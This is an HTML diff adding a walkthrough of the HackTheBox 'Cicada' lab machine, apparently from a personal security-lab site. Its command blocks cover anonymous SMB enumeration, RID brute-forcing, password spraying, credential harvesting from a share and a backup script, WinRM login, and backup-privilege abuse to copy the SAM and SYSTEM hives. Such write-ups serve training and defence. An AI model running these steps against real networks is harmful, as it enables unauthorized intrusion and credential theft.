@@ -1,0 +1,202 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Cicada</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Cicada (HTB – Easy)</h1>
+
+<p>
+This machine is an Active Directory environment where initial access is obtained through anonymous SMB access
+and password reuse. Multiple user accounts are chained until WinRM access is achieved. Privilege escalation
+relies on backup-related privileges to obtain local hashes and move to full compromise.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: 10.10.11.35  
+<br>Domain: cicada.htb  
+<br>Initial vector: guest SMB access → password disclosure  
+<br>Privilege escalation: backup privileges to access SAM/SYSTEM  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Anonymous SMB access:</p>
+<pre>
+$ smbmap -u guest -p "" -d . -H 10.10.11.35
+Shares:
+HR (READ ONLY)
+DEV (NO ACCESS)
+...
+</pre>
+
+<p>List and download from HR:</p>
+<pre>
+$ smbmap -u guest -p "" -d . -H 10.10.11.35 -r HR
+$ smbmap -u guest -p "" -d . -H 10.10.11.35 --download 'HR\Notice from HR.txt'
+-> Password: Cicada$M6Corpb*@Lp#nZp!8
+</pre>
+
+<h2>User Enumeration</h2>
+
+<p>RID brute with guest:</p>
+<pre>
+$ nxc smb 10.10.11.35 -u "guest" -p '' --rid-brute
+-> Users: john.smoulder, sarah.dantelia, michael.wrightson, david.orelious, emily.oscars, ...
+</pre>
+
+<p>Spray the recovered password:</p>
+<pre>
+$ nxc smb 10.10.11.35 -u Potential_Users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
+-> Valid: michael.wrightson
+</pre>
+
+<p>Further enumeration with Michael:</p>
+<pre>
+$ enum4linux -a -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
+-> description for david.orelious: "Just in case I forget my password is aRt$Lp#7t*VQ!3"
+</pre>
+
+<p>Access DEV share as David:</p>
+<pre>
+$ smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -d .
+$ smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r 'DEV'
+$ smbmap --download 'DEV/Backup_script.ps1'
+</pre>
+
+<p>Backup_script.ps1 contains credentials:</p>
+<pre>
+$username = "emily.oscars"
+$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+</pre>
+
+<h2>Foothold</h2>
+
+<p>WinRM access as Emily:</p>
+<pre>
+$ nxc winrm 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -X 'ipconfig'
+$ evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+</pre>
+
+<p>
+At this point, user access is obtained and user.txt can be read.
+</p>
+
+<h2>Privilege Escalation</h2>
+
+<p>
+Privilege enumeration (e.g. with winPEAS or manual checks) shows backup-related privileges such as
+<code>SeBackupPrivilege</code>.
+</p>
+
+<p>Typical approach:</p>
+<pre>
+whoami /priv
+</pre>
+
+<p>
+With backup privileges, it is possible to read sensitive system files (SAM and SYSTEM) by abusing backup semantics.
+One common method is to copy or dump:
+</p>
+
+<pre>
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+</pre>
+
+<p>
+These files can be exfiltrated and processed offline (e.g. using <code>impacket-secretsdump</code>) to recover local
+administrator hashes, then reused for lateral movement or local admin access.
+</p>
+
+
+<h2>Conclusion</h2>
+<p>
+The machine chains weak information disclosure (HR share), password reuse, and embedded credentials in backup scripts
+to move across multiple users. Privilege escalation is achieved by abusing backup privileges to access protected
+system files and recover administrator credentials, resulting in full compromise.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
